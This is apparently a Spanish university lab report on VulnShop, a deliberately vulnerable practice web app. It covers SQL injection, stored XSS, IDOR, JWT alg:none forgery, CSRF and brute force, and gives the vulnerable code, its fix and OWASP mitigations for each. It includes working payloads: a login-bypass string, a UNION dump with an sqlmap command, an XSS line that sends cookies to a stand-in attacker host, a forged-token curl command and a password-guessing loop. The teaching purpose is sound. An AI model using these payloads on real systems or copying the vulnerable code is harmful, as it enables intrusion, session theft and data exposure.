# Informe técnico — VulnShop

**Trabajo Práctico Integrador · Seguridad en el Desarrollo de Software (UTN)**

Integrantes: Daniel Alexander Patolsky · Angel Nahuel Luna (89627) · Marcos Ignacio Belli (95348) · Marcos Mitnik (89499) · Valentino Gabriel Rocca (94774).

Este informe acompaña a la aplicación VulnShop. Para cada vulnerabilidad se describe el problema, se muestra cómo explotarlo, se compara el código vulnerable con el corregido y se cita la referencia de OWASP. Todas las pruebas se hacen en local: **18080** es la versión vulnerable y **18081** la segura.

> Dejá un espacio bajo cada "Explotación" para pegar la captura de pantalla cuando corras la demo.

---

## 1. SQL Injection (A03:2021 – Injection)

### Descripción
La aplicación arma consultas SQL concatenando directamente datos que vienen del usuario (el email y la contraseña del login, el término del buscador). Como el valor del usuario se mezcla con la estructura de la consulta, un atacante puede cambiar el significado de la query.

### Explotación
**Login (bypass de autenticación).** En http://localhost:18080/login:
- Email: `' OR '1'='1' -- `
- Contraseña: cualquier cosa

La consulta resultante es:
```sql
SELECT * FROM users WHERE email = '' OR '1'='1' -- ' AND password = '...'
```
La condición `'1'='1'` siempre es verdadera y el `--` comenta el resto, así que devuelve el primer usuario (admin) y se inicia sesión sin saber la contraseña.

_(captura aquí)_

**Buscador (volcado de datos).** En el buscador escribí:
```
' UNION SELECT id,email,password,role,id,email FROM users -- 
```
Aparecen los usuarios con sus contraseñas. Automatizado con sqlmap:
```bash
sqlmap -u "http://localhost:18080/?q=test" -p q --batch --dump -T users
```

_(captura aquí)_

### Código vulnerable vs. corregido
`src/routes/auth.js`:
```js
// VULNERABLE: concatena la entrada del usuario
const sql = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";
const user = db.prepare(sql).get();

// SEGURO: consulta parametrizada; la entrada nunca se interpreta como SQL
const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email);
if (!user || !passwordMatches(user.password, password)) { /* 401 */ }
```

### Mitigación
- Consultas **parametrizadas** (prepared statements) siempre.
- Usuario de base de datos con **mínimo privilegio**.
- No devolver mensajes de error de SQL al cliente.
- Referencia: OWASP A03:2021 – Injection; OWASP SQL Injection Prevention Cheat Sheet.

---

## 2. XSS almacenado (A03:2021 – Injection)

### Descripción
El texto de una reseña se guarda tal cual y se vuelve a renderizar en el HTML sin escapar. Un atacante puede guardar un `<script>` que se ejecuta en el navegador de cualquier usuario que vea el producto.

### Explotación
En un producto (ej. http://localhost:18080/product/3), publicá como reseña:
```html
<script>alert(document.cookie)</script>
```
Al recargar, el script se ejecuta. Como la cookie de sesión **no es HttpOnly** en la versión vulnerable, se puede robar enviándola a un servidor del atacante:
```html
<script>new Image().src='http://atacante/c?'+document.cookie</script>
```

_(captura aquí)_

### Código vulnerable vs. corregido
`src/views/product.ejs`:
```ejs
<%# VULNERABLE: salida sin escapar, el navegador ejecuta el <script> %>
<%- r.body %>

<%# SEGURO: salida escapada; el <script> se muestra como texto %>
<%= r.body %>
```
Además, la versión segura agrega defensa en profundidad (`src/app.js`):
```js
// Cookie no accesible desde JS
cookie: { httpOnly: true, sameSite: 'strict' }
// Cabecera que bloquea scripts inline inyectados
res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");
```

### Mitigación
- **Escapar la salida** según el contexto (HTML, atributo, JS).
- Cookies de sesión **HttpOnly**.
- **Content-Security-Policy** para bloquear scripts inline.
- Referencia: OWASP A03:2021; OWASP XSS Prevention Cheat Sheet.

---

## 3. IDOR – Insecure Direct Object Reference (A01:2021 – Broken Access Control)

### Descripción
El detalle de un pedido se obtiene por su `id` en la URL (`/orders/:id`) y el servidor no verifica que el pedido pertenezca al usuario que lo pide. Cambiando el número se accede a datos de otros usuarios.

### Explotación
Logueado como Marcos (su pedido es el #1), entrá a:
```
http://localhost:18080/orders/2
```
Vas a ver el pedido de Lucía (otro usuario), con sus productos y datos. En la versión segura devuelve 403.

_(captura aquí)_

### Código vulnerable vs. corregido
`src/routes/orders.js`:
```js
const order = db.prepare('SELECT * FROM orders WHERE id = ?').get(req.params.id);

// SEGURO: se controla el propietario del recurso
if (order.user_id !== res.locals.user.id && res.locals.user.role !== 'admin') {
  return res.status(403).render('page', { /* Prohibido */ });
}
// VULNERABLE: no hay control -> cualquiera ve cualquier pedido
```

### Mitigación
- Verificar **autorización por propietario** en cada acceso a un recurso, del lado del servidor.
- No confiar en que el id "no se adivina"; usar control de acceso, no oscuridad.
- Referencia: OWASP A01:2021 – Broken Access Control.

---

## 4. JWT mal validado (A02:2021 – Cryptographic Failures / A07 – Auth Failures)

### Descripción
La API autentica con un JSON Web Token. La validación vulnerable confía en el campo `alg` que viene en el token y acepta `alg: none` (sin firma), además de usar un secreto débil y conocido (`secret`). Un atacante puede forjar un token con `role: admin`.

### Explotación
Forjá un token con `alg:none` y rol admin:
```bash
HDR=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PL=$(printf '{"uid":99,"role":"admin"}'   | base64 | tr '+/' '-_' | tr -d '=')
TOKEN="$HDR.$PL."
curl -H "Authorization: Bearer $TOKEN" http://localhost:18080/api/admin/users
```
La versión vulnerable devuelve la lista de usuarios; la segura responde 401.

_(captura aquí)_

### Código vulnerable vs. corregido
`src/lib/jwt.js`:
```js
// VULNERABLE: confía en el header del atacante
if (header.alg === 'none') return payload;        // acepta sin firma
// y además valida con un secreto débil ('secret')

// SEGURO: exige HS256, recalcula la firma con un secreto fuerte,
// compara en tiempo constante y controla expiración
if (header.alg !== 'HS256') return null;
if (!crypto.timingSafeEqual(firmaRecibida, firmaEsperada)) return null;
if (payload.exp && Date.now()/1000 > payload.exp) return null;
```

### Mitigación
- Fijar el algoritmo esperado (**no** aceptar `none` ni leer `alg` del token).
- **Secreto fuerte** desde variable de entorno, nunca hardcodeado.
- Verificar **expiración** y comparar firmas en tiempo constante.
- Referencia: OWASP A02/A07:2021; OWASP JWT Cheat Sheet.

---

## 5. CSRF – Cross-Site Request Forgery (A01:2021 – Broken Access Control)

### Descripción
El formulario de cambio de email hace un POST que solo depende de la cookie de sesión. No lleva token anti-CSRF ni la cookie usa `SameSite`, así que una página externa puede enviar ese POST en nombre de la víctima mientras está logueada.

### Explotación
1. Iniciá sesión en la versión vulnerable (18080).
2. Abrí `informe/csrf-poc.html` en el mismo navegador.
3. La página envía sola el formulario y te cambia el email a `hackeado@atacante.com`, sin que hagas nada.

En la versión segura el mismo ataque da 403 (falta el token) y la cookie `SameSite=strict` ni siquiera se envía desde otro origen.

_(captura aquí)_

### Código vulnerable vs. corregido
`src/routes/profile.js` + `src/lib/csrf.js`:
```js
// SEGURO: el POST exige un token anti-CSRF ligado a la sesión
const csrfGuard = SECURE ? verifyCsrf : (req,res,next)=>next();
router.post('/profile/email', requireLogin, csrfGuard, handler);

// VULNERABLE: sin token, el POST se acepta solo con la cookie
```
Y la cookie (`src/app.js`): `sameSite: 'strict'` en la versión segura.

### Mitigación
- **Token anti-CSRF** por sesión en los formularios que cambian estado.
- Cookies de sesión con `SameSite=Strict` (o `Lax`).
- Referencia: OWASP A01:2021; OWASP CSRF Prevention Cheat Sheet.

---

## Extra: Fuerza bruta en el login (A07:2021 – Identification and Authentication Failures)

La versión vulnerable no limita los intentos de login, así que se puede probar contraseñas en masa. La versión segura aplica **rate limiting** (máximo 5 intentos cada 5 minutos por IP, `express-rate-limit`) y guarda las contraseñas con **scrypt** en vez de texto plano.

```bash
# En la vulnerable se puede iterar sin freno:
for p in 123456 admin admin123 password; do
  curl -s -o /dev/null -X POST http://localhost:18080/login \
    --data "email=admin@vulnshop.test" --data "password=$p"
done
```

---

## Conclusión
El mismo conjunto de funcionalidades puede ser inseguro o seguro según cómo se programe. En todos los casos la corrección pasó por principios conocidos: no mezclar datos con código (consultas parametrizadas, escape de salida), validar del lado del servidor (autorización por propietario, validación estricta de JWT, tokens anti-CSRF) y aplicar defensa en profundidad (HttpOnly, CSP, SameSite, rate limiting). El interruptor `MODE` permite comparar ambos mundos sin cambiar la funcionalidad.
